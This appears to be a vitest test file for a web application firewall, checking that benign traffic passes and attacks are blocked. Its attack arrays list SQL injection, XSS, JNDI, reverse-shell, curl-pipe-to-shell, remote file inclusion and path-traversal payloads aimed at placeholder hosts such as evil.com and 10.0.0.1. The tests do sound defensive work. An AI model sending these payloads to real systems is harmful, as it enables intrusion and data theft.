import { describe, expect, it } from 'vitest';
import type { ProtectionLevel } from '@/domain/levels';
import type { QueryMap } from '@/domain/values';
import { createWafEngine } from '@/engine/engine';
import { createMockContext } from './helpers/mock-context';

/**
 * Traffic that production apps genuinely send. Every entry must survive the
 * `default` preset at `high`; a regression here is a false positive, which is
 * the failure mode that gets a WAF turned off.
 */
const BENIGN_QUERIES: ReadonlyArray<readonly [string, QueryMap]> = [
  ['oauth redirect', { redirect_uri: 'https://app.example.com/callback?state=abc' }],
  ['cdn asset', { avatar: 'https://cdn.example.com/u/42.png' }],
  ['webhook url', { url: 'https://hooks.example.com/services/T0/B0/XYZ' }],
  ['jsonapi include', { include: 'author,comments' }],
  ['bare include word', { include: 'include' }],
  ['pipe-delimited tags', { tags: 'rails|php|node|curl' }],
  ['semicolon list', { ids: 'a;b;c' }],
  ['apostrophe text', { q: "O'Brien and sons" }],
  ['sort params', { sort: 'created_at', order: 'desc' }],
  ['price template', { label: 'Total: ${amount}' }],
  ['icu message', { msg: 'Hello ${name}, welcome' }],
  ['backtick markdown', { body: 'Use `npm install` and then run it' }],
  ['email', { email: 'user+tag@example.com' }],
  ['iso timestamp', { from: '2026-09-19T12:00:00Z' }],
  ['uuid', { id: 'c0704270-816a-4309-b84d-424684c85f0f' }],
  ['encoded version', { v: '1%2e2%2e3' }],
  ['hex color', { theme: '#ff00aa' }],
  ['png data uri', { src: 'data:image/png;base64,iVBORw0KGgo=' }],
  ['pagination', { page: '1', per_page: '50' }],
  ['bounding box', { bbox: '-3.7,-38.5,-3.6,-38.4' }],
  ['nested filter', { filter: { status: 'open', owner: 'ana' } }],
  ['array param', { tag: ['node', 'waf'] }],
];

const BENIGN_BODIES: ReadonlyArray<readonly [string, string]> = [
  ['json schema', '{"required":["email"],"include":true}'],
  ['validation message', '{"error":"This field is required"}'],
  ['user prose', '{"bio":"I include my cat in every photo"}'],
  ['nested payload', '{"user":{"name":"Ana","roles":["admin","editor"]}}'],
  ['icu template', '{"greeting":"Hi ${firstName}! You have {count} messages"}'],
  ['sql-adjacent prose', '{"title":"How to speed up a query"}'],
  ['markdown post', '{"md":"# Title\\n\\nSome **bold** text and a [link](https://x.com)"}'],
  ['csv metadata', '{"columns":["id","name","email"],"delimiter":";"}'],
];

const BENIGN_PATHS: readonly string[] = [
  '/api/v1/users/42',
  '/assets/app.2f3a9b.css',
  '/blog/how-to-use-node.js',
  '/docs/guide/quick-start.html',
  '/v2.1/reports/monthly',
];

/** `[label, lowest level that must block it, query]`. */
const ATTACK_QUERIES: ReadonlyArray<
  readonly [string, ProtectionLevel, QueryMap, string]
> = [
  ['sqli union', 'low', { id: "1' UNION SELECT password FROM users--" }, 'preset-sqli-classic-query'],
  ['sqli load_file', 'low', { id: "1 AND load_file('/etc/passwd')" }, 'preset-sqli-dbms-primitives'],
  ['sqli into outfile', 'low', { id: "1 INTO OUTFILE '/var/www/s.php'" }, 'preset-sqli-dbms-primitives'],
  ['sqli xp_cmdshell', 'low', { id: "1; EXEC xp_cmdshell('dir')" }, 'preset-sqli-dbms-primitives'],
  ['sqli versioned comment', 'low', { id: '1/*!50000UNION*/SELECT 1' }, 'preset-sqli-versioned-comment'],
  ['sqli string tautology', 'balanced', { u: "admin' OR 'a'='a" }, 'preset-sqli-tautology'],
  ['sqli paren tautology', 'balanced', { u: "x') OR ('1'='1" }, 'preset-sqli-tautology'],
  ['sqli select from', 'balanced', { f: 'SELECT name FROM customers' }, 'preset-sqli-select-from'],
  ['nosql operator (bracketed)', 'balanced', { user: { $ne: 'null' } }, 'preset-sqli-nosql-operator'],
  ['sqli order by', 'high', { sort: '1 ORDER BY 9--' }, 'preset-sqli-blind'],
  ['sqli case when', 'high', { id: '1 CASE WHEN (1=1) THEN 1 ELSE 0 END' }, 'preset-sqli-blind'],
  ['sqli char chain', 'high', { id: 'CHAR(104,101,108,108,111)' }, 'preset-sqli-blind'],
  ['sqli comment close', 'high', { u: "admin'-- " }, 'preset-sqli-blind'],

  ['xss script tag', 'balanced', { q: '<script>alert(1)</script>' }, 'preset-xss-query'],
  ['xss percent-encoded', 'balanced', { q: '%3Cscript%3Ealert(1)' }, 'preset-xss-encoded-tag'],
  ['xss entity-encoded', 'balanced', { q: '&lt;script&gt;alert(1)' }, 'preset-xss-encoded-tag'],
  ['xss data:text/html', 'balanced', { next: 'data:text/html,<x>' }, 'preset-xss-dangerous-uri'],
  ['xss srcdoc', 'balanced', { html: '<iframe srcdoc="&lt;x">' }, 'preset-xss-attribute-vector'],
  ['xss formaction', 'balanced', { html: '<button formaction=x>' }, 'preset-xss-attribute-vector'],
  ['xss fromCharCode', 'high', { q: 'String.fromCharCode(88,83,83)' }, 'preset-xss-js-primitives'],

  ['rce jndi', 'low', { q: '${jndi:ldap://evil.com/a}' }, 'preset-rce-jndi'],
  ['rce jndi nested', 'low', { q: '${${lower:j}ndi:ldap://x}' }, 'preset-rce-jndi'],
  ['rce /dev/tcp shell', 'low', { c: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' }, 'preset-rce-reverse-shell'],
  ['rce nc -e', 'low', { c: 'nc -e /bin/sh 10.0.0.1 4444' }, 'preset-rce-reverse-shell'],
  ['rce curl pipe sh', 'low', { c: 'curl http://evil.com/x.sh | sh' }, 'preset-rce-download-exec'],
  ['rce python -c', 'low', { c: 'python -c "import os"' }, 'preset-rce-download-exec'],
  ['rce certutil', 'low', { c: 'certutil.exe -urlcache -f http://evil/x.exe' }, 'preset-rce-windows-lolbin'],
  ['rce semicolon cat', 'low', { cmd: '; cat config.yml' }, 'preset-rce-unix-cmd'],
  ['rce backtick', 'low', { cmd: '`whoami`' }, 'preset-rce-unix-cmd'],
  ['rce pipe with argument', 'low', { cmd: 'x | curl http://evil.com' }, 'preset-rce-unix-cmd'],
  ['rce os.system', 'balanced', { c: 'os.system("id")' }, 'preset-rce-lang-exec'],
  ['rce java exec', 'balanced', { c: 'Runtime.getRuntime().exec("id")' }, 'preset-rce-lang-exec'],
  ['rce java serialized', 'balanced', { c: 'rO0ABXNyABFqYXZh' }, 'preset-rce-deserialization'],
  ['rce php serialized', 'balanced', { c: 'O:8:"Exploit":1:{s:3:"cmd";}' }, 'preset-rce-deserialization'],
  ['rce ${IFS}', 'high', { c: 'echo${IFS}hello' }, 'preset-rce-shell-expression'],

  ['rfi php://filter', 'low', { page: 'php://filter/convert.base64-encode/resource=x' }, 'preset-rfi'],
  ['rfi data wrapper', 'low', { page: 'data://text/plain;base64,PD9waHA=' }, 'preset-rfi'],
  ['rfi expect wrapper', 'low', { page: 'expect://id' }, 'preset-rfi'],
  ['rfi phar wrapper', 'low', { page: 'phar://evil.phar/x' }, 'preset-rfi'],
  ['rfi php superglobal', 'low', { c: '$_GET[cmd]' }, 'preset-rce-php'],
  ['rfi remote script', 'balanced', { page: 'https://evil.com/shell.php' }, 'preset-rfi-remote-url'],
  ['rfi trailing question mark', 'balanced', { page: 'http://evil.com/shell?' }, 'preset-rfi-remote-url'],
  ['rfi include syntax', 'balanced', { c: "include('http://evil/x')" }, 'preset-rfi-include-syntax'],
];

const ATTACK_PATHS: ReadonlyArray<readonly [string, ProtectionLevel, string]> = [
  ['traversal plain', 'low', '/files/../../etc/passwd'],
  ['traversal percent-encoded', 'low', '/files/%2e%2e%2f%2e%2e%2fetc/passwd'],
  ['traversal double-encoded', 'low', '/files/%252e%252e%252f'],
  ['traversal overlong utf-8', 'low', '/files/..%c0%af..%c0%afetc'],
  ['traversal mixed encoding', 'low', '/files/.%2e/.%2e/etc'],
];

const DANGEROUS_UPLOADS: readonly string[] = [
  'shell.php',
  'shell.phtml',
  'backdoor.jsp',
  'payload.ps1',
  'shell.php.jpg',
  'shell.asp.png',
];

const BENIGN_UPLOADS: readonly string[] = [
  'invoice.pdf',
  'photo.jpeg',
  'report.2026.xlsx',
  'archive.tar.gz',
];

const UA = { 'user-agent': 'Mozilla/5.0' } as const;

describe('preset coverage — false positives', () => {
  const engine = createWafEngine({ presets: ['default'], level: 'high' });

  const assertAllowed = async (
    input: Parameters<typeof createMockContext>[0],
  ): Promise<void> => {
    const result = await engine.handle(createMockContext(input).ctx);
    // Surface the offending rule id in the failure message.
    expect(`${result.decision}:${result.matchedRule?.id ?? ''}`).toBe('allow:');
  };

  it.each(BENIGN_QUERIES)('allows benign query — %s', async (_label, query) => {
    await assertAllowed({ path: '/api/items', query, headers: UA });
  });

  it.each(BENIGN_BODIES)('allows benign body — %s', async (_label, body) => {
    await assertAllowed({ path: '/api/items', method: 'POST', body, headers: UA });
  });

  it.each(BENIGN_PATHS)('allows benign path — %s', async (path) => {
    await assertAllowed({ path, headers: UA });
  });

  it.each(BENIGN_UPLOADS)('allows benign upload — %s', async (name) => {
    await assertAllowed({ path: '/upload', method: 'POST', headers: UA, files: [{ name }] });
  });
});

describe('preset coverage — attacks', () => {
  it.each(ATTACK_QUERIES)(
    'blocks %s from level %s',
    async (_label, level, query, ruleId) => {
      const engine = createWafEngine({ presets: ['default'], level });
      const result = await engine.handle(
        createMockContext({ path: '/api/items', query, headers: UA }).ctx,
      );
      expect(result.decision).toBe('block');
      expect(result.matchedRule?.id).toBe(ruleId);
    },
  );

  it.each(ATTACK_PATHS)('blocks %s from level %s', async (_label, level, path) => {
    const engine = createWafEngine({ presets: ['default'], level });
    const result = await engine.handle(createMockContext({ path, headers: UA }).ctx);
    expect(result.decision).toBe('block');
  });

  it.each(DANGEROUS_UPLOADS)('blocks dangerous upload — %s', async (name) => {
    const engine = createWafEngine({ presets: ['default'], level: 'balanced' });
    const result = await engine.handle(
      createMockContext({ path: '/upload', method: 'POST', headers: UA, files: [{ name }] }).ctx,
    );
    expect(result.decision).toBe('block');
  });
});

describe('preset coverage — level gating', () => {
  it('does not block balanced-level attacks at low', async () => {
    const engine = createWafEngine({ presets: ['default'], level: 'low' });
    const result = await engine.handle(
      createMockContext({ query: { u: "admin' OR 'a'='a" }, headers: UA }).ctx,
    );
    expect(result.decision).toBe('allow');
  });

  it('nested query values reach the rules without throwing', async () => {
    const engine = createWafEngine({ presets: ['default'], level: 'high' });
    const result = await engine.handle(
      createMockContext({ query: { filter: { q: '<script>alert(1)</script>' } }, headers: UA }).ctx,
    );
    expect(result.decision).toBe('block');
  });
});
